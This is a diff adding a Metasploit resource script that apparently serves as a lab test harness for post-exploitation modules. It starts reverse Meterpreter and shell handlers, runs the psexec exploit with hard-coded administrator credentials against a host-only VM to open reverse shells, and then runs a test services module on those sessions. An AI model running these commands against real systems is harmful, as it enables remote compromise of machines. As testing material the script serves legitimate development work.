@@ -1,0 +1,51 @@
+# rc script to start a rev meterp handler and set autorun my test module
+
+# let's get our vms started first
+
+<ruby>
+	# Let's require in our "awesome" resource helping file
+	resource_dir = File.join(Msf::Config.install_root, "scripts", "resource")
+	require File.join(resource_dir, "helpers","demo_methods")
+	# now that rc_tab_completion has been merged you can just:
+	#require 'helpers/demo_methods'
+	test_mods_dir = File.join(Msf::Config.install_root, "test", "modules")
+	run_single("loadpath \"#{test_mods_dir}\"") # assuming you put test mods here
+	
+	include Msf::Ui::Console::Resource::Helpers
+	# let's set some stuff up using those new methods
+	# assign lhost to be whatever IP I have on arg network, which is my host only network
+	auto_lhost("192.168.170.1/24")
+	# setup a handler on 8888
+	auto_handler("8888") # meterpreter/reverse_tcp handler by default
+	# setup a shell handler too
+	auto_handler("8887", "windows/shell/reverse_tcp")
+</ruby>
+
+
+
+# run psexec to setup our meterp session, could use db_fun here, or a binary or an exploit etc
+use windows/smb/psexec
+set PAYLOAD windows/meterpreter/reverse_tcp
+set DisablePayloadHandler true
+set ExitOnSession false
+set RHOST 192.168.170.128
+set LPORT 8888
+set SMBUser administrator
+set SMBPass	lab
+exploit -z
+# now the shell payload
+set PAYLOAD windows/shell/reverse_tcp
+set LPORT 8887
+exploit -z
+
+use post/test/services
+# we're just using hard coded session numbers for now
+set SESSION 1
+
+# wait to make sure sessions are established, but user can hit enter to short circuit the pause
+<ruby>
+	rc_pause(8,true)
+</ruby>
+run
+set SESSION 2
+run
